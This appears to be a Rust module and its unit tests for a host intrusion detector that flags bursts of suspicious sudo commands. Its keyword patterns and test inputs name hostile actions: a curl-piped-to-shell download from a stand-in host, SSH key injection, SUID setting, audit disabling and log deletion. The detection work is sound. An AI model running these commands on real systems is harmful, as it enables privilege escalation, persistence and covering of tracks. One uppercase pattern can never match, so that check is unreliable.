use std::collections::{BTreeSet, HashMap, VecDeque};

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

pub struct SudoAbuseDetector {
    threshold: usize,
    window: Duration,
    windows: HashMap<String, VecDeque<SudoEventSample>>,
    alerted: HashMap<String, DateTime<Utc>>,
    host: String,
}

#[derive(Clone)]
struct SudoEventSample {
    ts: DateTime<Utc>,
    command: String,
    reasons: Vec<String>,
}

impl SudoAbuseDetector {
    pub fn new(host: impl Into<String>, threshold: usize, window_seconds: u64) -> Self {
        Self {
            threshold,
            window: Duration::seconds(window_seconds as i64),
            windows: HashMap::new(),
            alerted: HashMap::new(),
            host: host.into(),
        }
    }

    /// Detect suspicious sudo activity bursts from a single user.
    ///
    /// Expected event contract:
    /// - kind: `sudo.command`
    /// - details.user: username
    /// - details.command: raw command string
    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        if event.kind != "sudo.command" {
            return None;
        }

        let user = event.details["user"].as_str()?.trim();
        if user.is_empty() {
            return None;
        }

        let command = event.details["command"].as_str()?.trim();
        if command.is_empty() {
            return None;
        }

        let reasons = classify_suspicious(command);
        if reasons.is_empty() {
            return None;
        }

        let now = event.ts;
        let cutoff = now - self.window;

        let entries = self.windows.entry(user.to_string()).or_default();
        while entries.front().is_some_and(|sample| sample.ts < cutoff) {
            entries.pop_front();
        }
        entries.push_back(SudoEventSample {
            ts: now,
            command: command.to_string(),
            reasons,
        });

        let count = entries.len();
        if count < self.threshold {
            return None;
        }

        if let Some(&last) = self.alerted.get(user) {
            if now - last < self.window {
                return None;
            }
        }

        self.alerted.insert(user.to_string(), now);

        let mut reason_set = BTreeSet::new();
        for sample in entries.iter() {
            for reason in &sample.reasons {
                reason_set.insert(reason.clone());
            }
        }

        let recent_commands: Vec<String> = entries
            .iter()
            .rev()
            .take(5)
            .map(|sample| sample.command.clone())
            .collect();

        let reasons: Vec<String> = reason_set.into_iter().collect();
        let severity = score_severity(&reasons, count);

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!("sudo_abuse:{user}:{}", now.format("%Y-%m-%dT%H:%MZ")),
            severity,
            title: format!("Suspicious sudo behavior detected for user {user}"),
            summary: format!(
                "{count} suspicious sudo commands by {user} in the last {} seconds",
                self.window.num_seconds()
            ),
            evidence: serde_json::json!([{
                "kind": "sudo.command",
                "user": user,
                "count": count,
                "window_seconds": self.window.num_seconds(),
                "reasons": reasons,
                "recent_commands": recent_commands,
            }]),
            recommended_checks: vec![
                format!("Review full sudo trail for user {user}"),
                "Validate if commands were authorized by change management".to_string(),
                "Temporarily suspend sudo access if activity is not expected".to_string(),
            ],
            tags: vec![
                "auth".to_string(),
                "sudo".to_string(),
                "privilege".to_string(),
                "abuse".to_string(),
            ],
            entities: vec![EntityRef::user(user.to_string())],
        })
    }
}

/// Classify a sudo command into threat categories with severity scores.
/// Returns (reasons, total_score). Higher score = more dangerous.
fn classify_suspicious(command: &str) -> Vec<String> {
    let lower = command.to_ascii_lowercase();
    let mut reasons = Vec::new();

    // Identity manipulation (T1136 / T1098)
    if lower.contains("useradd")
        || lower.contains("adduser")
        || lower.contains("usermod")
        || lower.contains("passwd")
        || lower.contains("chpasswd")
    {
        reasons.push("identity_change".to_string());
    }

    // Privilege policy change (T1548)
    if lower.contains("visudo")
        || lower.contains("/etc/sudoers")
        || lower.contains("/etc/sudoers.d")
        || lower.contains("setfacl")
    {
        reasons.push("privilege_policy_change".to_string());
    }

    // SUID/SGID manipulation — classic privilege escalation (T1548.001)
    if lower.contains("chmod +s")
        || lower.contains("chmod u+s")
        || lower.contains("chmod g+s")
        || lower.contains("chmod 4")
        || lower.contains("chmod 2")
    {
        reasons.push("suid_manipulation".to_string());
    }

    // Security control tampering
    if lower.contains("iptables")
        || lower.contains("nft")
        || lower.contains("ufw disable")
        || lower.contains("ufw reset")
        || lower.contains("auditctl")
        || lower.contains("setenforce 0")
        || lower.contains("apparmor_parser -R")
    {
        reasons.push("security_control_change".to_string());
    }

    // Remote script execution (T1059.004)
    if (lower.contains("curl") || lower.contains("wget"))
        && (lower.contains("| sh")
            || lower.contains("| bash")
            || lower.contains("sh -c")
            || lower.contains("bash -c"))
    {
        reasons.push("remote_script_execution".to_string());
    }

    // Service disruption
    if lower.contains("systemctl stop")
        || lower.contains("systemctl disable")
        || lower.contains("kill -9")
    {
        reasons.push("service_disruption".to_string());
    }

    // SSH key injection (T1098.004)
    if lower.contains("authorized_keys")
        || lower.contains(".ssh/")
        || (lower.contains("ssh-keygen") && lower.contains("-f"))
    {
        reasons.push("ssh_key_injection".to_string());
    }

    // Crontab manipulation (T1053.003)
    if lower.contains("crontab") || lower.contains("/etc/cron") || lower.contains("/var/spool/cron")
    {
        reasons.push("cron_persistence".to_string());
    }

    // /tmp execution — staging area for exploits
    if lower.contains("/tmp/") && (lower.contains("chmod +x") || lower.contains("./")) {
        reasons.push("tmp_execution".to_string());
    }

    // Destructive commands
    if (lower.contains("rm -rf") || lower.contains("rm -f"))
        && (lower.contains("/etc")
            || lower.contains("/var")
            || lower.contains("/home")
            || lower == "rm -rf /")
    {
        reasons.push("destructive_command".to_string());
    }

    // Log tampering — covering tracks (T1070)
    if lower.contains("/var/log")
        && (lower.contains("rm") || lower.contains("truncate") || lower.contains("> /"))
    {
        reasons.push("log_tampering".to_string());
    }

    reasons
}

/// Score the severity of accumulated reasons.
/// Returns Critical for privilege escalation, High for multiple suspicious, Medium for single.
fn score_severity(reasons: &[String], count: usize) -> Severity {
    let critical_reasons = [
        "privilege_policy_change",
        "suid_manipulation",
        "remote_script_execution",
        "ssh_key_injection",
        "log_tampering",
    ];
    let has_critical = reasons
        .iter()
        .any(|r| critical_reasons.contains(&r.as_str()));

    if has_critical || count >= 5 {
        Severity::Critical
    } else if count >= 3 || reasons.len() >= 2 {
        Severity::High
    } else {
        Severity::Medium
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use innerwarden_core::event::Severity as Sev;

    fn sudo_event(user: &str, command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "host".to_string(),
            source: "journald".to_string(),
            kind: "sudo.command".to_string(),
            severity: Sev::Info,
            summary: format!("{user} ran sudo: {command}"),
            details: serde_json::json!({
                "user": user,
                "run_as": "root",
                "command": command,
            }),
            tags: vec!["auth".to_string(), "sudo".to_string()],
            entities: vec![EntityRef::user(user.to_string())],
        }
    }

    #[test]
    fn ignores_non_suspicious_sudo_commands() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event(
                "deploy",
                "/usr/bin/systemctl status nginx",
                base
            ))
            .is_none());
        assert!(det
            .process(&sudo_event(
                "deploy",
                "/usr/bin/journalctl -u nginx",
                base + Duration::seconds(1)
            ))
            .is_none());
    }

    #[test]
    fn emits_incident_at_threshold_for_same_user() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event("deploy", "usermod -aG sudo attacker", base))
            .is_none());
        let inc = det
            .process(&sudo_event(
                "deploy",
                "curl -fsSL http://x | sh",
                base + Duration::seconds(1),
            ))
            .expect("incident expected");
        // 2 commands with critical reasons (identity_change + remote_script_execution)
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.incident_id.starts_with("sudo_abuse:deploy:"));
        assert_eq!(inc.evidence[0]["count"], 2);
    }

    #[test]
    fn dedup_suppresses_realert_within_window() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        let _ = det.process(&sudo_event("deploy", "usermod -aG sudo attacker", base));
        let _ = det.process(&sudo_event(
            "deploy",
            "curl -fsSL http://x | sh",
            base + Duration::seconds(1),
        ));
        assert!(det
            .process(&sudo_event(
                "deploy",
                "auditctl -e 0",
                base + Duration::seconds(2)
            ))
            .is_none());
    }

    #[test]
    fn classifies_suid_manipulation() {
        let reasons = classify_suspicious("chmod +s /tmp/exploit");
        assert!(reasons.contains(&"suid_manipulation".to_string()));
    }

    #[test]
    fn classifies_ssh_key_injection() {
        let reasons = classify_suspicious("cp key.pub /root/.ssh/authorized_keys");
        assert!(reasons.contains(&"ssh_key_injection".to_string()));
    }

    #[test]
    fn classifies_cron_persistence() {
        let reasons = classify_suspicious("crontab -e");
        assert!(reasons.contains(&"cron_persistence".to_string()));
    }

    #[test]
    fn classifies_log_tampering() {
        let reasons = classify_suspicious("rm -f /var/log/auth.log");
        assert!(reasons.contains(&"log_tampering".to_string()));
    }

    #[test]
    fn classifies_tmp_execution() {
        let reasons = classify_suspicious("chmod +x /tmp/payload && /tmp/payload");
        assert!(reasons.contains(&"tmp_execution".to_string()));
    }

    #[test]
    fn severity_scales_with_threat() {
        // Single non-critical reason = Medium
        assert_eq!(
            score_severity(&["service_disruption".into()], 1),
            Severity::Medium
        );
        // Critical reason = Critical regardless of count
        assert_eq!(
            score_severity(&["suid_manipulation".into()], 1),
            Severity::Critical
        );
        // Multiple reasons = High
        assert_eq!(
            score_severity(&["identity_change".into(), "service_disruption".into()], 2),
            Severity::High
        );
        // 5+ commands = Critical
        assert_eq!(
            score_severity(&["service_disruption".into()], 5),
            Severity::Critical
        );
    }

    #[test]
    fn ignores_safe_sudo_commands() {
        assert!(classify_suspicious("apt update").is_empty());
        assert!(classify_suspicious("systemctl status nginx").is_empty());
        assert!(classify_suspicious("journalctl -u sshd").is_empty());
        assert!(classify_suspicious("ls /root").is_empty());
    }

    #[test]
    fn users_are_isolated() {
        let mut det = SudoAbuseDetector::new("host", 2, 300);
        let base = Utc::now();
        assert!(det
            .process(&sudo_event("alice", "usermod -aG sudo attacker", base))
            .is_none());
        assert!(det
            .process(&sudo_event(
                "bob",
                "curl -fsSL http://x | sh",
                base + Duration::seconds(1)
            ))
            .is_none());
    }
}
